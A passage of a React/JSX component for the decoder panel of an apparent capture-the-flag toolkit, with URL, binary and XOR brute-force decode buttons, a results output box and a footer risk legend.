                        : "border-border/40 hover:bg-muted/10 text-foreground"
                    )}
                  >
                    URL Dec
                  </button>
                  <button
                    onClick={handleDecodeBinary}
                    className={cn(
                      "py-2 border rounded font-mono text-[10px] font-bold uppercase tracking-wider transition-all",
                      decoderMode === 'binary_dec'
                        ? "bg-primary/10 border-primary/50 text-primary shadow-sm"
                        : "border-border/40 hover:bg-muted/10 text-foreground"
                    )}
                  >
                    Binary Dec
                  </button>
                  <button
                    onClick={handleGenerateXORScript}
                    className={cn(
                      "py-2 border rounded font-mono text-[10px] font-bold uppercase tracking-wider transition-all",
                      decoderMode === 'xor'
                        ? "bg-accent/20 border-accent/60 text-accent shadow-sm"
                        : "border-accent/20 bg-accent/5 hover:bg-accent/15 text-accent"
                    )}
                  >
                    XOR Brute
                  </button>
                </div>
              </div>
            </div>

            {/* Results Output panel */}
            <div className="bg-card/10 border border-border/40 rounded-xl p-5 flex flex-col gap-4">
              <div className="flex items-center justify-between">
                <span className="text-[11px] font-black font-mono tracking-wider uppercase text-foreground">Decoded Results Output</span>
                <button
                  onClick={() => { navigator.clipboard.writeText(decoderOutput); alert('Decoded data copied to vault clipboard!') }}
                  disabled={!decoderOutput}
                  className="px-2 py-1 rounded bg-muted/10 hover:bg-muted/20 border border-border/30 font-mono text-[9px] font-black uppercase text-muted-foreground hover:text-foreground disabled:opacity-40 transition-all flex items-center gap-1"
                >
                  <Copy className="size-3" /> Copy Output
                </button>
              </div>

              <textarea
                readOnly
                value={decoderOutput}
                placeholder="Results output will render here cleanly..."
                className="flex-1 w-full min-h-[220px] bg-black/60 border border-border/50 rounded-lg p-3 font-mono text-xs text-primary/90 placeholder:text-muted-foreground/30 focus:outline-none resize-none"
              />

              <div className="p-3 bg-amber-500/[0.03] border border-amber-500/10 rounded-lg flex items-start gap-2.5">
                <Binary className="size-3.5 text-amber-500/50 mt-0.5" />
                <p className="font-mono text-[9px] text-muted-foreground/60 leading-relaxed uppercase">
                  💡 Note: In-browser XOR brute-force scanner automatically scans all 256 keys to match "flag", "ctf", "htb", "thm" or brace structures.
                </p>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Footer Legend */}
      <div className="sticky bottom-0 bg-[#0a0a0c]/95 backdrop-blur border-t border-border/30 px-6 py-3 flex items-center gap-4 shrink-0">
        <span className="font-mono text-[8px] text-muted-foreground/40 uppercase tracking-widest">Risk Level:</span>
        {Object.entries(riskLabels).map(([k, v]) => (
          <span key={k} className={cn("px-1.5 py-0.5 rounded border font-mono text-[7px] font-black uppercase", riskColors[k])}>
            {v}
          </span>
        ))}
        <span className="ml-auto font-mono text-[8px] text-muted-foreground/30 uppercase">
          ⚔️ Duelist C2 Tactical Operations Toolkit · Fully Offline Capable
        </span>
      </div>
    </div>
  )
}
